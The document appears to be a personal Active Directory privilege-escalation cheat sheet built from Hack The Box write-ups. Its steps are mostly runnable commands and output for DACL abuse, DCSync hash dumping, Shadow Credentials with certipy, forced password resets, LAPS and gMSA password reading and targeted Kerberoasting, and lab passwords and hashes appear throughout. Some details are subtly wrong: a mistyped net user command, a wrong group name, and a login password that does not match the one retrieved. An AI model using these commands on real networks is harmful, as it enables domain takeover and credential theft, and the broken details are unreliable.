- if the attacker obtains GenericWrite over a computer object, they can modify the msds-KeyCredentialLink attribute. As a result, they can create Shadow Credentials and gain NT Hash

```

## WriteDACL
This abuse can be carried out when we are controlling an object that has `WriteDacl` over another object. The attacker can write / modify ACE (Access Control Entry) to/of the target object’s DACL (Discretionary Access Control List). This can give the attacker full control of the target object.

[More](https://www.hackingarticles.in/abusing-ad-dacl-writedacl/)

### Add DCSync
![alt text](https://0xdfimages.gitlab.io/img/1571511066627.webp)
We can add DCSync rights to object and dump credentials!! 

The user SVC-ALFRESCO@HTB.LOCAL is a member of the group SERVICE ACCOUNTS@HTB.LOCAL.
The group SERVICE ACCOUNTS@HTB.LOCAL is a member of the group PRIVILEGED IT ACCOUNTS@HTB.LOCAL.
The group PRIVILEGED IT ACCOUNTS@HTB.LOCAL is a member of the group ACCOUNT OPERATORS@HTB.LOCAL.
The members of the group ACCOUNT OPERATORS@HTB.LOCAL have `GenericAll` privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL.
Interstingly The group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL has `WriteDACL` permission on domain HTB.LOCAL.

How to Abuse?

Since we have `GenericAll` privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL, we can create a user and add it to this group.

Also Since EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL has `WriteDACL` permission on domain HTB.LOCAL, we can write DCSync rights to this user and then perform DCSync attack to get hashes from DC.

1. I can either add a user which I have or instead create new user and add it to this group.
```
# Creating new User and adding to EXCHANGE WINDOWS PERMISSIONS

net user marvel 'Passw0rd' \add \domain
net group "Windows Execution Permissions" marvel \add

# OR Adding user I already control (svc-alresfco) to EXCHANGE WINDOWS PERMISSIONS

net group "Exchange Windows Permissions" svc-alfresco /add /domain
```

2. Now to add DCSync rights to this user, we need  `PowerView.ps1`, so first we need to transfer PowerVie.ps1 on target and then import it into session.
```
# Transfer it whater way suitable
# import it into session

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\PowerView.ps1

# first create a PSCredential object

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPass = ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\marvel', $SecPass)

# Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity marvel -Credential $Cred -Rights DCSync

```

```
# Similary I can do it in one liner also, (this I am showing using svc-alfresco user)

Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

3.  Now since our user has DCSync rights, we should be able to dump users hashes from the domain controller.

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py svc-alfresco:s3rvice@10.10.10.161
```

[More](https://sanaullahamankorai.medium.com/hackthebox-forest-walkthrough-2843a6386032)
[More](https://0xdf.gitlab.io/2020/03/21/htb-forest.html)



**Powerview - Add-DomainObjectAcl**
```
# Transfer it whater way suitable
# import it into session

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\PowerView.ps1

# first create a PSCredential object

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPass = ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\marvel', $SecPass)

# Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity marvel -Credential $Cred -Rights DCSync

```

**Impacket-dacledit.py**
```
# Give full control
dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"

# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"
```


## WriteOwner
This abuse can be carried out when we are controlling an object that has `WriteOwner` over another object. The WriteOwner permission allows a user to change the ownership of an object to a different user or principal, including one controlled by an attacker. By exploiting this permission, an attacker can take ownership of a target object.
Once the attacker successfully changes the ownership of the object to a principal under their control, they gain the ability to fully manipulate the object

```
- If the “WriteOwner” privilege is applied to a group, attacker can make himself owner of that group and assign himself full control which eventually gives him rights to add members to that group.

- If the “WriteOwner” privilege is applied to a user, attacker can make himself owner of that user and assign himself full control over that user. Now attacker can initiate Targeted Kerberostingattack ,he can also ForcePasswordChange, means chaange password of thst user

- If the “WriteOwner” privilege is applied to a computer object,  attacker can make himself owner of that machine and assign himself full control, attacker obtains unrestricted access and control.

- If the “WriteOwner” privilege is applied to a Domain object ie DC, attacker can make himself owner of that DC and assign himself full control, He can now perform DCSync Attack
```
[More](https://www.hackingarticles.in/abusing-ad-dacl-writeowner/)

### Full Control on Group
```
1. Granting Ownership: make user the ownwe of that group by using impacket-owneredit.
2. Granting Full Control: grant user the full control over that group using Impacket-dacledit.
3. Add himself or another user in control to that group (using net rpc).

Now user can do many things with that group for example that group has ReadLAPSPassword on a DC then attacker can read Local Administrator password from the ms-MCS-AdmPwd property on the DC computer object.
```
**EXAMPLE**

![alt text](https://0xdf.gitlab.io/img/image-20241027145542883.webp)

[More](https://0xdf.gitlab.io/2025/03/15/htb-certified.html#bloodhound)

In this scenario Judith hash writeowner on Management group,  we will makehim owner of it and grant him full control and then add him to that grop

1. Granting Ownership: make user the ownwe of that group by using `impacket-owneredit`.
```
oxdf@hacky$ impacket-owneredit -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41

Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```
2. Granting Full Control: grant user the full control over that group using `Impacket-dacledit`.
```
oxdf@hacky$ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41

Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20241027-152313.bak
[*] DACL modified successfully!
```
3. Add himself to that group (using net rpc).
```
oxdf@hacky$ net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```
This command doesn’t return anything. I can check the group members with another net command:
```
oxdf@hacky$ net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
CERTIFIED\judith.mader
CERTIFIED\management_svc
```

```
owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41
dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41
net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```
### Full Control on User
```
1. Granting Ownership: make user the ownwe of that user by using impacket-owneredit.
2. Granting Full Control: grant user the full control over that userusing Impacket-dacledit.

Now user can do many things with that user for example he can add an SPN and perform Targeted Kerberosting, he can also ForceChangePassword
```
**EXAMPLE**

![alt text](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfpJqO8PbMnE_RtfRYc-lz59QmM5ZW9u-8_USRdiO7qrWgkhe8kMWHkGpqL1JVZmdYzrFeM4LPcOmDPRSFb6OBDrtaSNSOs8xDaFNtJ0fvTuOpS-YXH3pT00882qJ2lVu6UhTid76_Nuc7TZdK6DkML2SOzScAQ36UNcXrIWWfH7DXBojdbjW-g1SoxP57/s16000/59.png)

[More](https://www.hackingarticles.in/abusing-ad-dacl-writeowner/)

1. Granting Ownership: make user the ownwe of that user by using impacket-owneredit
```
impacket-owneredit -action write -new-owner 'sakshi' -target-dn 'CN=ankur,CN=Users,DC=ignite,DC=local' 'ignite.local'/'sakshi':'Password@1' -dc-ip 192.168.1.6
```
2. Granting Full Control: grant user the full control over that userusing Impacket-dacledit.
```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sakshi' -target-dn 'CN=ankur,CN=Users,DC=ignite,DC=local' 'ignite.local'/'sakshi':'Password@1' -dc-ip 192.168.1.6
```

## Shadow Credentials Attack

[More](https://www.hackingarticles.in/shadow-credentials-attack/)

The Shadow Credentials attack takes advantage of improper permissions on the `msDS-KeyCredentialLink` attribute of a target user or computer account.

When Object we controll has Permissions like `GenericWrite`, `GenericAll` or `AddKeyCredentialLink` we can modify the `msDS-KeyCredentialLink` attribute of a target user or computer account.

**What can be done?**

Once attacker identify we have permission to modify attribute on target (ie`GenericWrite` or `GenericAll`), attacker adds their own public key to the `msDS-KeyCredentialLink` attribute of the target account. This process essentially “registers” the attacker’s key as a valid authentication method for the target.

The attacker then creates a certificate in PFX format using the private key associated with the injected public key, With the generated certificate, the attacker authenticates to the domain using `PKINIT`. The KDC validates the attacker’s public key against the msDS-KeyCredentialLink attribute and issues a `Ticket Granting Ticket (TGT)` for the target account.

Now Attacker got TGT for the target, using this attacker can

- Perform lateral movement within the network.
- Use the S4U2self protocol to impersonate other users.
- Extract NTLM hashes from the Privilege Attribute Certificate (PAC).

Basically we want to extract NTLM Hash, we can do this using 2 tools PyWhisker and Certipy. with PyWhisker is long process, whicle with certipy its just one coommand.

[PyWhisker](https://github.com/ShutdownRepo/pywhisker)

[Certipy](https://github.com/ly4k/Certipy)

We will see using Certipy, 

**EXAMPLE**

[More](https://0xdf.gitlab.io/2025/03/15/htb-certified.html#get-ntlm-for-management_svc)

![alt text](https://0xdf.gitlab.io/img/image-20241027145406785.webp)

In this scenario we already made addedd ourself owner of "Management" group by abusing writeowner making ourself owner and getting full control.
```
We already tried to find Vulnerable ADCS Template using certify with user "Judith" but didnt found any template.

Now Since we have GenericWrite on Management_SVC user we will fetch NTLM hash of it by exploting shadow credentials.

Now again We try to find Vulnerable ADCS Template using certify with user "Management_SVC" but didnt found any template.

Similary since Management_SVC has GenericAll on CA_Operator we will do again exploit Shadow Cred to get NTLLM hash

Now once again using user CA_operator we try to find Vulnerable Template for ADCS, and yes we found!!!

Below command prints out the NTLM hash for the management_svc account.
```


```
certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
```
```
oxdf@hacky$ certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '91c77677-13a9-3225-4533-8a5ec50d7c90'
[*] Adding Key Credential with device ID '91c77677-13a9-3225-4533-8a5ec50d7c90' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '91c77677-13a9-3225-4533-8a5ec50d7c90' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```
Now again We try to find Vulnerable ADCS Template using certify with user "Management_SVC" but didnt found any template.

Similary since Management_SVC has GenericAll on CA_Operator we will do again exploit Shadow Cred to get NTLLM hash
```
oxdf@hacky$ certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290'
[*] Adding Key Credential with device ID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```
Now once again using user CA_operator we try to find Vulnerable Template for ADCS, and yes we found!!!, There’s a template named CertifiedAuthentication that is vulnerable to ESC9.

https://0xdf.gitlab.io/2025/03/15/htb-certified.html#esc9-background

## ForceChangePassword

If object in our control has ForceChangePassword on another user, then we can change password of that user and own it.
```
- We can do it remotely using "Linux net rpc"
- We can do it using Windows net binary if we have shell
- We can do it using Powershell by uploading Powerview.ps1
```
**Remotely using "Linux net rpc"**

[EXAMPLE](https://0xdf.gitlab.io/2025/04/19/htb-administrator.html#auth-as-benjamin)

1. Change Password
```
net rpc password "benjamin" "0xdf0xdf." -U "administrator.htb"/"michael"%"0xdf0xdf." -S 10.10.11.42
```
2. Verify using Crackmapexec
```
crackmapexec smb 10.10.11.42 -u benjamin -p '0xdf0xdf.'
```
OR  
```
crackmapexec winrm 10.10.11.42 -u benjamin -p '0xdf0xdf.'
```

**Using Windows net binary**
```
```
**Using Powershell by uploading Powerview.ps1**

[More](https://0xdf.gitlab.io/2021/11/06/htb-pivotapi.html#change-drzaiusss-password)
```
1. Clone https://github.com/PowerShellMafia/PowerSploit and checkout the dev branch.
2. Now I’ll upload PowerView.ps1 to Target
3. load PowerView.ps1 and change the password
```
Load PowerView.ps1 and change the password
```
PS C:\> Import-Module Programdata\pv.ps1 
PS C:\> $pass = ConvertTo-SecureString 'qwe123QWE!@#' -AsPlainText -Force 
PS C:\> Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $pass 
```


## ReadLAPSPassword

If accounts with permissions to view (for ex `ReadLAPSPassword`) or modify LAPS information are compromised, an attacker could gain access to local administrator password.

**About "Local Administrator Password Solution" (LAPS) ?**

[More](https://adsecurity.org/?p=1790) [More](https://adsecurity.org/?p=3164) [More](https://www.hackingarticles.in/credential-dumpinglaps/) [More](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-laps/)

The real problem with local accounts on a computer in an enterprise environment is that If 50 computers on a network have the local administrator account of “Administrator” and a password of “P@55w0rd1!”, and if any one of those computers is compromised, then they will all be compromised. Windows is very helpful. So helpful that if you pass the local admin credentials to another computer with the same local credentials, access is granted as if you logged on with the target system credentials. Dump administrator credentials on one to get admin on all!.

The best way to mitigate this issue is to ensure every computer has a different local administrator account password that is long, complex, and random and that changes on a regular basis.

Microsoft (LAPS) provides automated local administrator account management for every computer in Active Directory. A client-side component installed on every computer that generates a random password, updates the (new) LAPS password attribute (ms-Mcs-AdmPwd) on the associated AD computer account, and sets the password locally. LAPS configuration is managed through Group Policy which provides the values for password complexity, password length, local account name for password change, password change frequency, etc.

In Short LAPS removes scope of lateral movement for attacker by using same password with other computer using PTH.

In particular, the solution mitigates the risk of lateral escalation that results when customers use the same administrative local account and password combination on their computers. For environments in which users are required to log on to computers without domain credentials, password management can become a complex issue. Such environments greatly increase the risk of a Pass-the-Hash (PtH) credential replay attack. LAPS resolves this issue by setting a different, random password for the common local administrator account on every computer in the domain. By using unique, randomly generated passwords for each local administrator account, LAPS makes it harder for attackers to exploit pass-the-hash attacks. 

Even if an attacker compromises one machine, they cannot easily move laterally to other machines with the same local administrator credentials due to the unique passwords managed by LAPS.


**Confidential attribute `ms-Mcs-AdmPwd`**

LAPS stores the password for each computer’s local administrator account in Active Directory in a confidential attribute called `ms-Mcs-AdmPwd`. It stores the clear-text LAPS password and can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users. This value is blank until the LAPS password is changed. No one but Domain Admins can view this attribute by default. For this reason, delegation of the `ms-mcs-AdmPwd` attribute has to be carefully planned and performed.

There is also one more attribute `ms-mcs-AdmPwdExpirationTime` that stores the LAPS password reset date/time value in integer8 format, any authenticated user can view the value of the ms-mcs-AdmPwdExpirationTime attribute.


**Identify LAPS**

```
# Identify if installed to Program Files
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
dir 'C:\Program Files\LAPS\CSE\'
dir 'C:\Program Files (x86)\LAPS\CSE\'
```

WinPEAS can also pull the settings:
```
  [+] LAPS Settings
   [?] If installed, local administrator password is changed frequently and is restricted by ACL
    LAPS Enabled: 1
    LAPS Admin Account Name:
    LAPS Password Complexity: 3
    LAPS Password Length: 20
    LAPS Expiration Protection Enabled:
```

**Attack Scenerio: compromised user has `writeOwner` on X group and X group has `ReadLAPSPassword` privilege**

![alt text](https://0xdfimages.gitlab.io/img/image-20220913071513981.webp)

JDgodd has ownership and `WriteOwner` on the Core Staff group and Core Staff has `ReadLAPSPassword` on the DC computer object.

We have controll over users yoshihide, nikk37 and JDgodd, for all three we checked “Outbound Control Rights in bloodhound and only JDgodd has it. This user cant winrm. but we have nikk37 winrm shell.

Since JDgodd has `WriteOwner`, we will use his credentials to add himslef to 'Core Staff' group, then since 'Core Staff' has `ReadLAPSPassword` privilege wil read LAPS password from the `ms-MCS-AdmPwd` property on the computer object 'DC.StreamIO.HTB'. which basically gives us local Administrator password. Finally we can winRM as Administrator.

[More](https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#shell-as-administrator)

1. Identify if LAPS is installed (In this scenerio we already know LAPS is installed but in case we dont we can identify using below commands).
```
# Identify if installed to Program Files
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
dir 'C:\Program Files\LAPS\CSE\'
dir 'C:\Program Files (x86)\LAPS\CSE\'
```

2. Load PowerView into session
```
*Evil-WinRM* PS C:\Temp> upload powerview.ps1

*Evil-WinRM* PS C:\Temp> Import-Module .\Powerview.ps1

```

3. Create a Credential object for JDoog user
```
*Evil-WinRM* PS C:\Temp> $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Temp> $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
```

4. Add JDgood to 'Core Staff' Group
```
*Evil-WinRM* PS C:\Temp> Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
*Evil-WinRM* PS C:\Temp> Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```

5. Verify that user is now member of 'Core Staff'
```
*Evil-WinRM* PS C:\Temp> net user jdgodd
```

6. Now read the LAPS password from the `ms-MCS-AdmPwd` property on the computer object

We can read it by multiple ways
 
- Powershell's Get-ADComputer
```
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
OR
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```
- PowerView's Get-DomainComputer
```
Get-DomainComputer "MachineName" -Properties 'cn','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```
- CrackMapExec
```
crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
```
- LdapSearch
```
ldapsearch -H ldap://10.10.11.158 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

For me only ldapsearch worked!!

```
┌──(kali㉿kali)-[~]
└─$ ldapsearch -H ldap://10.10.11.158 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: !$NeMA3545dU.3

# search reference
ref: ldap://ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://DomainDnsZones.streamIO.htb/DC=DomainDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://streamIO.htb/CN=Configuration,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```
7. Now I can use password  !$NeMA3545dU.3 to winrm as Admnistrartor!!
```
evil-winrm -u administrator -p '-Z4I/T1W0%+4nF' -i 10.10.11.158
```

**Attack Scenerio: compromised user is part of group `LAPS_Readers`**

[More](https://0xdf.gitlab.io/2022/08/20/htb-timelapse.html#enumeration)

1. Check groups of which user is part of
```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```
2. To read the LAPS password, you just need to use` Get-ADComputer` and specifically request the` ms-mcs-admpwd` property:

```
# The local administrator password for this box is “uM[3va(s870g6Y]9i]6tMu{j”.

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : uM[3va(s870g6Y]9i]6tMu{j
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :

```

**Attack Scenerio : compromised user is part of `Account Operators` group**

![alt text](https://0xdfimages.gitlab.io/img/image-20210426121335088.webp)

In this case compromised user Jari has 'ForceChangePassword' over user Gibdeon, which means he can simply reset password of him and own him.

Secondly Gibdeon is part of `Account operators` members of this group can Create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers.

[More](https://0xdf.gitlab.io/2021/11/06/htb-pivotapi.html#shell-as-administrador)


1. Identified LAPS is there
```
*Evil-WinRM* PS C:\programdata> ls 'c:\program files\LAPS\CSE\Admpwd.dll'


    Directory: C:\program files\LAPS\CSE


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/22/2016   8:02 AM         148632 Admpwd.dll
```
2. Changed the password of Gibdeon since user has `forcechangepassword` privilege over him, and now I own him.
```
*Evil-WinRM* PS C:\programdata> Import-Module .\pv.ps1 
*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString 'qwe123QWE!@#' -AsPlainText -Force 
*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity gibdeon -AccountPassword $pass
```
The challenge this time is that gibdeon isn’t in WinRM or SSH. I’ll have to work from the jari shell using a PSCredential object as gibdeon.
```
*Evil-WinRM* PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential('gibdeon', $pass)
```
3. Create a new user bob, As an account operator, gibdeon can create accounts:
```
*Evil-WinRM* PS C:\programdata> New-AdUser bob -credential $cred -enabled $true -accountpassword $pass
```
4. bob needs to be in the WinRM and SSH groups
```
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity WinRM -Credential $cred -Members 'bob'
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity SSH -Credential $cred -Members 'bob'
```
5. bob also needs to be in the `LAPS Read` group which exist
```
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'LAPS READ' -Credential $cred -Members 'bob'
```
6. Now connect over SSH/winrm as bob, Drop into PowerShell and get the LAPS password from the computer object
```
sshpass -p 'qwe123QWE!@#' ssh bob@10.10.10.240

licordebellota\bob@PIVOTAPI C:\Users\bob>powershell

PS C:\Users\bob> Get-ADComputer PivotAPI -property 'ms-mcs-admpwd' 

```
The ms-mcs-admpwd value, “7BzS0y089bE250p625Bb” is the current local administrator password for the box.





## Targeted Kerberosting

[More](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting)

[More](https://0xdf.gitlab.io/2025/04/19/htb-administrator.html#enumeration-1)

We we control an object that has a` GenericAll`, `GenericWrite`, `WriteProperty` or `Validated-SPN` over the target, then we can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting. This technique is called Targeted Kerberoasting. Once the Kerberoast hash is obtained, it can possibly be cracked to recover the account's password if the password used is weak enough.

Note that its only good if this account is user account instead of a Service/Machine account, because Service/Machine hash cant be cracked easily.

**Attack Scenario**

[More](https://0xdf.gitlab.io/2025/04/19/htb-administrator.html#enumeration-1)

![alt text](https://0xdf.gitlab.io/img/image-20241117063839454.webp)

Bloodhound shows that emily has GenericWrite over ethan

![alt text](https://0xdf.gitlab.io/img/image-20241117065000695.webp)

we will use [targetedkerberos.py](https://github.com/ShutdownRepo/targetedKerberoast.git) and [uv](https://github.com/astral-sh/uv)
```
1. clone the repo for targetedkerberos.py to my host, and add dependencies using 'uv' 
2. make sure my clock is synced and run the script
3. crack the hash using hashcat
```
1. clone the repo for targetedkerberos.py to my host, and add dependencies using 'uv' 
```
oxdf@hacky$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
oxdf@hacky$ cd targetedKerberoast/
oxdf@hacky$ uv add --script targetedKerberoast.py -r requirements.txt 
```
2. make sure my clock is synced and run the script
```
oxdf@hacky$ sudo ntpdate administrator.htb
oxdf@hacky$ uv run targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

## ReadGMSAPassword

In this we abuse the permissions listed in the target gMSA account's `msDS-GroupMSAMembership` attribute's DACL. The `msDS-GroupMSAMembership` attribute of a gMSA specifies who is permitted to obtain the password.  If we control an object that is permitted in this attribute, then we can retrieve an attribute called `msDS-ManagedPassword`. This attribute is a Binary Large Object (BLOB) that contains the password.

**What is GMSA Group Managed Service Accounts (gMSA)?**

Service Accounts are not made for humans but instead for services which often require elevated privileges, their passwords are rarely changed or not regularly rotated which puts them at Risk!, especially because they can be targeted through Kerberoasting attacks.

A `gMSA (group Managed Service Account)` is a special type of account in Active Directory (AD) introduced in Windows Server 2012 to solve this exact problem. This object’s sole purpose is to be used as a service account, with the important feature of password rotation. A gMSA account can be used by one or more servers with compatible services. 

The gMSA’s password is managed by AD. It is automatically rotated every 30 days to a randomly generated password of 256 bytes, making it infeasible to crack.

When a server that uses this account needs to use the gMSA, it first requests the most recent password from the DC by retrieving an attribute called `msDS-ManagedPassword`. This attribute is a Binary Large Object (BLOB) that contains the password.

The `msDS-GroupMSAMembership` attribute of a gMSA specifies who is permitted to obtain the password,  If an attacker gains access to an account that has access to `msDS-ManagedPassword`, the attacker can read the password for the specific gMSA. 

[More](https://www.semperis.com/blog/golden-gmsa-attack/)
[More](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword)

**Attack Scenerio**

![alt text](https://0xdfimages.gitlab.io/img/image-20210816144106307.webp)
![alt text](https://0xdfimages.gitlab.io/img/image-20210816144237665.webp)

[More](https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html#enumeration-1)
[More](https://tpetersonkth.github.io/2022/05/14/HTB-Intelligence-Writeup.html)

We have compromised user `Ted.Graves`, Ted.Graves is a member of the ITSUPPORT group which has the ReadGMSAPassword permission on the SVC_INT account. This means that we can read the `SVC_INT` account’s password and thus compromise it.

1. To read the password of the SVC_INT account, we can use the Python script `gMSADumper.py` created by Micah Van Deusen, as performed below.

```
wget https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py
```
```
└─$ python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::b05dfb2636385604c6d36b0ca61e35cb
svc_int$:aes256-cts-hmac-sha1-96:77a2141a0d0b64a8858ff6eac44a82cb388161b70a0ee4557566f4a6fc2091aa
svc_int$:aes128-cts-hmac-sha1-96:e9b3d6e223cd226f04fb91aaf759765d
```

